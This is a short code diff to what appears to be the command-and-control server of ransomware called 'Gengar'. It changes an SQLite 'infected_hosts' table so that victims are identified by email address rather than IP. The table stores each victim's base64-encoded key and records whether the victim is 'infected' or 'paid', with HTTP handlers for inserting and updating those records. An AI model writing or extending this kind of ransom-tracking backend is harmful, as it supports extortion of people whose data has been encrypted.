@@ -11,8 +11,8 @@ We must provide a JSON as the one it follows:
 
 {
     'operation': 'insert'/'update'
-    'ip': ip_direction,
-    'key': encoded_key,
+    'mail': as a unique identifier,
+    'key': base64encoded_key,
     'date': datetime,
     'state': 'infected'/'paid'
 }
@@ -29,7 +29,7 @@ class DatabaseManager():
 
             self.query_executor = self.conn.cursor()
             self.query_executor.execute(
-                """create table if not exists infected_hosts(ip text primary key, key text not null, date text not null, state text);""")
+                """create table if not exists infected_hosts(mail text primary key, key text not null, date text not null, state text not null);""")
         except sqlite3.Error as e:
             print(e)
             raise Exception("Connection failed!")
@@ -88,9 +88,9 @@ class GengarServer(BaseHTTPRequestHandler):
 
         # do not check if some registries exists
         if operation == 'insert':
-            database_manager.execute_query('''insert into infected_hosts(ip, key, date, state) values(?,?,?,?);''', (jsondata['ip'], jsondata['key'], jsondata['date'], jsondata['state']))
+            database_manager.execute_query('''insert into infected_hosts(mail, key, date, state) values(?,?,?,?);''', (jsondata['mail'], jsondata['key'], jsondata['date'], jsondata['state']))
         elif operation == 'update':
-            database_manager.execute_query('''update infected_hosts set state=? where ip=?''',(jsondata['state'], jsondata['ip']))
+            database_manager.execute_query('''update infected_hosts set state=? where mail=?''',(jsondata['state'], jsondata['mail']))
         else:
             print("Incorrect operation")
 
